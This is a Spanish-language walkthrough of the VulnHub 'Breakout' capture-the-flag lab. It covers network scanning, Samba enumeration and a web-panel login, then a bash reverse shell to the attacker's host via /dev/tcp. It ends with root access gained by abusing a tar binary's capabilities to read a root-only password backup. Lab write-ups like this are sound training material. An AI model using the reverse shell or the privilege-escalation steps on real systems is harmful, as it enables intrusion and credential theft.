# Breakout

- https://www.dcode.fr/brainfuck-language Pagina para desencriptar 

## Summary

- IP -> random 192.168.
- Ports -> TCP (80,139,445,10000,20000), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 80 -> Apache httpd 2.4.51
    - 139 -> Samba smbd 4.6.2
    - 445 -> Samba smbd 4.6.2
    - 10000 -> http Miniserv 1.981
    - 20000 -> http Miniserv 1.830

Cosas a tomar en cuenta en una WebPage:
	- Errores de codigo, dejan olvidada alguna cosa dentro de la pagina
	- Ctrl + u -> Para ver el codigo de la WebPage y encontrar alguna pista en todo su codigo
	- 


## Recon
- **ifconfig** Para ver nuestra direccion IP '192.168.68.108'
- **nmap 192.168.68.1/24** Hacemos eso para que nmap pueda buscar direcciones IP en nuestro entorno, ademas de exponer sus servicios, asi como mostrar que tipo de dispositivo es y asi podremos encontrar la maquina de VulHub '192.168.68.111'

- **nmap -sV -p- 192.168.68.111** 
	- sV -> Detectamos la version y los servicios activos 
	- -p- ->Escaneo de todos los puertos TCP

Encontramos en la pagina web por el puerto 80 en su codigo fuente una encriptacion, por lo que nos disponemos a desencriptar.
Ahora nos disponemos a verificar los otros dos puertos http que son el 10000 y 20000 en la WebPage

Miramos que en el puerto 20000 tenemos un login, por lo que tendriamos la passwd pero nos falta el usuario. Por lo que nos disponemos a hacer enumeracion de la sigueinte manera.

- **enum4linux -a 192.168.68.111** Colocamos la direccion IP de la maquina victima y hacemos la enumeracion de datos, informacion, sesiones, etc...
Encontramos un posible usuari llamado Cyber

Una vez dentro de la pagina, nos ponemos a inspeccionarla para que ver como podemos encontrar, en esta maquina un comando Shell (cmd). Para esta maquina existen dos formas de ejecutar comandos, la primera es con el simbolo cmd y la segunda es por una pestana de la misma pagina, en donde nos permite la ejecucion de los comandos.

Ahi podemos colocar diferentes comandos para poder encontrar informacion valiosa.

## User
Una vez utilizando esa cmd, podemos hacer una revershell a nuestra maquina de atacante de la siguiente manera
Podemos observa la flag del usuario desde esa misma consola de la pagina web

- **bash -c 'bash -i >& /dev/tcp/192.168.68.108/443 0>&1'** En la cdm de la pagina web agregamos el comando de la ReverShell
- **nc -nlvp 443** Este comando en nuestra maquina de atacante para recibir la revershell de la maquina victima

- **cat /etc/issue** Para ver informacion del sistema
- **uname -a** Ver la version de Linux

## Root
- **find / -perm 4000 -type 2>/dev/null** Nos filtrara archivos binarios con permisos 
- **find / -perm 4000 -type f 2>/dev/null** Nos filtrara archivos binarios con permisos (f=files) buscara archivos files con permisos S
- **getcap -r / 2>/dev/null** Verificar los permisos de los archivos encontrados 'capabilities'
	- Encontramos ahi el **'/homeCyber/tar cap_dac_read_search=ep'**

* **cd /var/baskups** Para ir al directorio del servidor mismo y ver las passwd 
	* **ls -la** Para ver todos los archivos dentro de ese dir y ahi encontramos el '.old_pass.bak' que serian los passwd de respaldo antiguas

Nos regresamos al dir principal de Cyber para poder mover el archivo '.old_pass.bak' pero ese archivo solo lo puede leer root, por lo que ocuparemos el siguiente comando. 

- **./tar -cvf passwd.tar /var/backups/.old_pass.bak** Crearemos el archivo llamado 'passwd.tar' y el contenido de la ruta que queremos mover
- **tar -xf passwd.tar** Para hacer que nos abra el archivo que movimos y nos extrae un archiv **var**
- **cd var** Nos movemos dentro de var
	- **cd baskups** Nos movemos a backups y encontraremos otro archivo llamado '.old_pass.bak'
	- **cat .old_pass.bak** Para leer el archivo y nos muestra una passwd

- **su root** Para cambiar de usuario, en este caso es root y le ponemos la passwd que hemos encontrado
Ahora buscamos la flag de root.txt 